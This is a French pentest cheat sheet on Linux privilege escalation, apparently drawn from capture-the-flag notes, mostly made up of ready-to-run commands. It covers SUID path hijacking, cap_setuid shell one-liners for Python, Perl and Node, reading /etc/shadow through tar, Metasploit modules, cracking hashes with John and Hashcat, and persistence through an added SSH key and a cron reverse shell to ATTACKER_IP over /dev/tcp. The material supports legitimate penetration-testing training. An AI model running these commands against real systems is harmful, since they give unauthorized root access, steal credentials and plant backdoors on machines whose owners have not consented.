# üêß √âl√©vation de Privil√®ges Linux

[‚Üê Retour √† la table des mati√®res](../README.md)

## √ânum√©ration Initiale

### Commandes de base pour l'√©num√©ration
```bash
# V√©rifier les privil√®ges sudo de l'utilisateur
sudo -l

# Examiner les t√¢ches cron
cat /etc/crontab
crontab -l
ls -al /etc/cron*

# Trouver tous les fichiers accessibles par l'utilisateur
find / -user {username} 2>/dev/null

# Rechercher les fichiers writables
find / -not -type l -perm -o+w

# √ânum√©rer les services locaux
netstat -antp
netstat -tuln 127.0.0.1

# Informations syst√®me de base
cat /etc/shells
python --version
```

### Shell interactif
```bash
# Obtenir un shell interactif
/bin/bash -i
python -c 'import pty; pty.spawn("/bin/bash")'

# Cr√©er un shell propre (√©vite les probl√®mes de compatibilit√©)
script /dev/null -c bash
```

### G√©n√©rer un mot de passe pour /etc/shadow
```bash
openssl passwd -1 -salt abc password
```

## Commandes Utiles d'√ânum√©ration

### Recherche de Capabilities
```bash
# Chercher tous les binaires avec des capabilities
getcap -r / 2>/dev/null

# Chercher sp√©cifiquement cap_setuid (√©l√©vation de privil√®ges)
getcap -r / 2>/dev/null | grep -i "setuid\|cap_"

# Chercher toutes les capabilities dangereuses
getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_dac_read_search|cap_dac_override|cap_sys_admin"
```

**üí° Pourquoi getcap est important ?**
- Les capabilities Linux permettent de donner des permissions granulaires aux binaires
- Moins connu que SUID = souvent oubli√© lors de l'√©num√©ration
- Peut √™tre tout aussi exploitable qu'un binaire SUID root
- Exemple : `cap_setuid` permet de devenir root

## Kernel Exploits

### Linux Exploit Suggester
```bash
# Avec une session meterpreter active
# 1. T√©l√©charger le script depuis GitHub
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# 2. Upload sur la machine cible
upload /path/to/linux-exploit-suggester.sh

# 3. Ouvrir un shell et ex√©cuter
shell
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### Exploitation des CVE trouv√©es
```bash
# Le script liste les exploits et CVE disponibles
# Rechercher les exploits correspondants sur exploit-db.com
# Exemple de workflow :
# 1. Noter les CVE sugg√©r√©es
# 2. Rechercher sur https://www.exploit-db.com/
# 3. Downloader et compiler l'exploit
# 4. Ex√©cuter pour obtenir root
```

## Exploits Sp√©cifiques

### Chkrootkit (< 0.50)
```bash
# V√©rifier la version de chkrootkit
ps aux | grep check-down

# Si version vuln√©rable d√©tect√©e
use exploit/unix/local/chkrootkit
set SESSION session_id
set CHKROOTKIT /usr/bin/chkrootkit
run
```

## SUID Binaries

### Recherche de binaires SUID
```bash
# Trouver tous les binaires SUID
find / -perm -u=s -type f 2>/dev/null

# Exemple de sortie avec SUID :
# -rwsr-xr-x 1 root root 8344 Sep 23 2022 /usr/bin/welcome
# Le 's' indique le bit SUID activ√©
```

### Analyse d'un binaire SUID
```bash
# Analyser le type de fichier
file /usr/bin/welcome

# Examiner les cha√Ænes de caract√®res
strings /usr/bin/welcome

# Rechercher les appels syst√®me et biblioth√®ques
ltrace /usr/bin/welcome
strace /usr/bin/welcome
```

### Exploitation SUID - Path Hijacking
```bash
# Si le binaire appelle un autre programme sans chemin absolu
# Exemple : le binaire "welcome" appelle "service"

# 1. Cr√©er un faux binaire malveillant
echo '/bin/bash' > /tmp/service
chmod +x /tmp/service

# 2. Modifier le PATH pour inclure /tmp en premier
export PATH=/tmp:$PATH

# 3. Ex√©cuter le binaire SUID
/usr/bin/welcome
# R√©sultat : shell root car welcome s'ex√©cute avec les privil√®ges root
```

### Exploitation SUID - Remplacement de binaire
```bash
# Si un binaire sp√©cifique est appel√© et peut √™tre remplac√©
# Exemple : le binaire appelle /usr/bin/useless

# 1. Sauvegarder l'original (optionnel)
cp /usr/bin/useless /tmp/useless.bak

# 2. Remplacer par une copie de bash
rm /usr/bin/useless
cp /bin/bash /usr/bin/useless

# 3. Ex√©cuter le binaire SUID principal
/usr/bin/welcome
# R√©sultat : shell root
```

## Linux Capabilities

### C'est quoi les Capabilities ?

Les **Linux Capabilities** permettent de donner des permissions granulaires √† des binaires **sans donner tous les droits root** (contrairement au SUID).

**Exemple :** Au lieu de faire un binaire SUID root (qui donne tous les pouvoirs), on peut lui donner uniquement `cap_setuid` (changer d'UID).

| Capability | Permet de |
|------------|-----------|
| `cap_setuid` | Changer d'UID (devenir root) |
| `cap_net_bind_service` | Bind sur port < 1024 |
| `cap_dac_override` | Bypass permissions fichiers |
| `cap_dac_read_search` | Lire n'importe quel fichier |
| `cap_sys_admin` | Op√©rations admin (mount, etc.) |

### Recherche de binaires avec Capabilities
```bash
# Chercher tous les binaires avec des capabilities
getcap -r / 2>/dev/null

# Chercher sp√©cifiquement cap_setuid (√©l√©vation de privil√®ges)
getcap -r / 2>/dev/null | grep -i "setuid\|cap_"

# Exemple de sortie :
# /usr/bin/python3.8 = cap_setuid+ep
```

### Exploitation de cap_setuid

#### Avec Python
```bash
# Si Python a cap_setuid
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Explication :**
- `cap_setuid` permet √† Python de faire `os.setuid(0)` (devenir UID 0 = root)
- Ensuite on lance un shell bash ‚Üí root shell !

#### Avec Perl
```bash
# Si Perl a cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

#### Avec Node.js
```bash
# Si Node a cap_setuid
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]});'
```

### Exploitation d'autres Capabilities

#### cap_dac_read_search (lire n'importe quel fichier)
```bash
# Si tar a cap_dac_read_search
tar -cvf /tmp/shadow.tar /etc/shadow
cd /tmp
tar -xvf shadow.tar
cat etc/shadow
```

#### cap_sys_admin (mount, etc.)
```bash
# Si Python a cap_sys_admin (dangereux !)
# Permet de monter des syst√®mes de fichiers, etc.
# Voir GTFOBins pour exploits sp√©cifiques
```

### Checklist PrivEsc Linux (ordre logique)

**üìã Ordre recommand√© pour l'√©num√©ration :**

1. ‚úÖ **sudo -l** (toujours en premier - le plus rapide)
   ```bash
   sudo -l
   ```

2. ‚úÖ **SUID** : Binaires avec bit SUID
   ```bash
   find / -perm -4000 2>/dev/null
   ```

3. ‚úÖ **Capabilities** : Permissions granulaires (‚≠ê souvent oubli√© !)
   ```bash
   getcap -r / 2>/dev/null
   getcap -r / 2>/dev/null | grep -i "setuid\|cap_"
   ```

4. ‚úÖ **Groupes** : Appartenance √† des groupes privil√©gi√©s
   ```bash
   id
   # Groupes √† v√©rifier : docker, lxd, disk, video, sudo, admin
   ```

5. ‚úÖ **Cron jobs** : T√¢ches planifi√©es
   ```bash
   cat /etc/crontab
   crontab -l
   ls -al /etc/cron*
   ```

6. ‚úÖ **Writables** : Fichiers/dossiers modifiables
   ```bash
   find / -writable -type f 2>/dev/null | grep -v proc
   find / -writable -type d 2>/dev/null | grep -v proc
   ```

7. ‚úÖ **LinPEAS** si tu bloques (automatise tout)
   ```bash
   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

### Ressources pour Capabilities

- **GTFOBins** : https://gtfobins.github.io/
  - Cherche ton binaire (ex: "python")
  - Regarde la section "Capabilities"
  - Exemple : https://gtfobins.github.io/gtfobins/python/#capabilities

- **Capabilities communes exploitables :**
  - `cap_setuid` ‚Üí Devenir root (changer d'UID)
  - `cap_dac_read_search` ‚Üí Lire n'importe quel fichier
  - `cap_dac_override` ‚Üí Bypass permissions fichiers
  - `cap_sys_admin` ‚Üí Op√©rations admin (mount, etc.)

## Exemples concrets

### Exemple 1 : HTB "Cap" (cap_setuid sur Python)

```bash
# 1. √ânum√©ration apr√®s acc√®s initial
getcap -r / 2>/dev/null

# R√©sultat :
# /usr/bin/python3.8 = cap_setuid+ep
#                      ‚Üë‚Üë‚Üë‚Üë‚Üë‚Üë‚Üë‚Üë
#                      Exploitable !

# 2. Exploitation
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 3. V√©rification
id
# uid=0(root) gid=1000(user) groups=1000(user)
# ‚Üë‚Üë‚Üë UID=0 = root ‚úÖ

# 4. Flag
cat /root/root.txt
```

**üí° Explication :**
- `cap_setuid` permet √† Python de faire `os.setuid(0)` (devenir UID 0 = root)
- Ensuite on lance un shell bash ‚Üí root shell !
- `+ep` = Effective + Permitted (la capability est active)

### Exemple 2 : cap_setuid sur Perl

```bash
# Si Perl a cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Exemple 3 : cap_setuid sur Node.js

```bash
# Si Node a cap_setuid
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]});'
```

### Exemple 4 : cap_dac_read_search (lire /etc/shadow)

```bash
# Si tar a cap_dac_read_search (lecture bypass permissions)
tar -cvf /tmp/shadow.tar /etc/shadow
cd /tmp
tar -xvf shadow.tar
cat etc/shadow

# Extraire le hash root
grep root etc/shadow
# root:$6$xyz...:18600:0:99999:7:::
#      ‚Üë‚Üë‚Üë‚Üë‚Üë‚Üë‚Üë
#      Hash √† cracker

# Cracker avec John
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

### Workflow complet d'exploitation Capabilities

```bash
# 1Ô∏è‚É£ √ânum√©ration compl√®te
getcap -r / 2>/dev/null

# R√©sultats possibles :
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/tar = cap_dac_read_search+ep

# 2Ô∏è‚É£ V√©rifier GTFOBins pour le binaire trouv√©
# Aller sur https://gtfobins.github.io/
# Chercher le binaire (python, perl, tar, etc.)
# Section "Capabilities"

# 3Ô∏è‚É£ Exploiter selon la capability

# Pour cap_setuid (Python) :
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Pour cap_setuid (Perl) :
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Pour cap_dac_read_search (Tar) :
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar
cat etc/shadow

# 4Ô∏è‚É£ V√©rification root
id
whoami
cat /root/root.txt
```

### üéì Pourquoi les Capabilities sont importantes ?

**Comparaison SUID vs Capabilities :**

```
SUID (chmod u+s) :
   - Donne TOUS les privil√®ges root
   - Facile √† d√©tecter (find / -perm -4000)
   - Tr√®s connu des pentesters
   - Souvent surveill√© par les admins

Capabilities :
   - Donne des privil√®ges SP√âCIFIQUES
   - Moins connu = souvent oubli√© ‚≠ê
   - Pas d√©tect√© par les scanners SUID basiques
   - Plus moderne (depuis kernel 2.2)
   - Peut √™tre aussi dangereux que SUID !
```

**üí° Tips :**
- Toujours v√©rifier `getcap` m√™me si `sudo -l` et SUID ne donnent rien
- LinPEAS d√©tecte automatiquement les capabilities dangereuses
- `cap_setuid` = presque √©quivalent √† SUID root
- `cap_dac_read_search` = lire /etc/shadow, /root/.ssh/id_rsa, etc.

## Hash Dumping et Cracking

### R√©cup√©ration des hashes
```bash
# En tant que root, les hashes sont dans /etc/shadow
cat /etc/shadow

# Avec Metasploit (session meterpreter active)
use post/linux/gather/hashdump
set SESSION session_id
run
```

### Cracking avec Metasploit
```bash
# Module de cracking int√©gr√©
use auxiliary/analyze/crack_linux
set SHA512 true
# Ajouter les hashes r√©cup√©r√©s
run
```

### Cracking avec John the Ripper
```bash
# Combiner passwd et shadow
unshadow /etc/passwd /etc/shadow > hashes.txt

# Cracker avec John
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Afficher les mots de passe crack√©s
john --show hashes.txt
```

### Cracking avec Hashcat
```bash
# Identifier le type de hash
hashcat --example-hashes | grep -i sha512

# Cracker (exemple pour SHA512)
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Persistance

### Ajout de cl√© SSH
```bash
# Cr√©er le r√©pertoire .ssh si n√©cessaire
mkdir -p ~/.ssh

# Ajouter votre cl√© publique
echo "your_public_key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

### T√¢che cron malveillante
```bash
# Ajouter une t√¢che cron pour la persistance
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" | crontab -
```

## Ressources Utiles

- [GTFOBins](https://gtfobins.github.io/) - Bypass de s√©curit√© Unix (SUID, Sudo, Capabilities)
- [Reverse Shells](https://revshells.com/) - G√©n√©rateur de reverse shells
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) - Script d'√©num√©ration